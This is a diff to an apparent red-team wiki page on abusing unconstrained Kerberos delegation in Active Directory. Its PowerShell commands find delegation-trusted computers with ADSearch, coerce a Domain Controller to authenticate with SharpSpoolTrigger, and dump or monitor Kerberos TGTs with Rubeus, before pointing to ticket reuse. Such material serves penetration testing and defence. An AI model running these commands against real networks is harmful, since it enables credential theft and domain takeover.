@@ -32,29 +32,31 @@ Unconstrained delegation allows a machine to act on behalf of **any user** for *
 
 ```powershell
 # Look for vulnerable domain computers.
-.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+./ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
 
-# From your target, initiate any interaction with the server trusted for delegation that involves Kerberos authentication.
-dir \\$server\c$
+# From your target - a Domain Controller by any change -, initiate any interaction with the server trusted for delegation that involves Kerberos authentication.
+dir \\$CompromisedServerVulnerableToUnconstrainedDelegation\C$
 
 # On the compromised domain computer, list Kerberos TGTs.
-.\Rubeus.exe triage
+./Rubeus.exe triage
+
+# Extract TGTs you want to abuse.
+./Rubeus.exe dump /luid:$LUID
 ```
 
 Another way to perform this attack is to force your target (let's say a Domain Controller) to authenticate on the server you compromised. To do so, you can use [SharpSpoolTrigger](https://github.com/cube0x0/SharpSystemTriggers). It will force the authentication and you could therefore capture the Kerberos TGT with [Rubeus](https://github.com/GhostPack/Rubeus).
 
 ```powershell
 # Capture Kerberos tickets every 10 seconds on the computer you compromised.
-.\Rubeus.exe monitor /interval:10 /nowrap
+./Rubeus.exe monitor /interval:10 /nowrap
 
 # Listener is the host on which you are monitoring Kerberos tickets with Rubeus.
-.\SharpSpoolTrigger.exe $target $listener
+./SharpSpoolTrigger.exe $TargetFQDN $ListenerFQDN
 ```
 
-You can then perform [Pass the Ticket](/ad/passtheticket/) with listed Kerberos TGTs.
-
-{: .important }
-> If you managed to perform the second method an to get the Domain Controller TGT, **congratulations** you are Domain Admin.
+Depending of the nature of TGTs, perform either:
+* [Pass the Ticket](/ad/passtheticket/) with users' TGTs (identifiable via service `krbtgt/$domain`).
+* [S4U2Self Abuse](/ad/s4u2self/) with machines' TGTs.
 
 ## Persistence
 
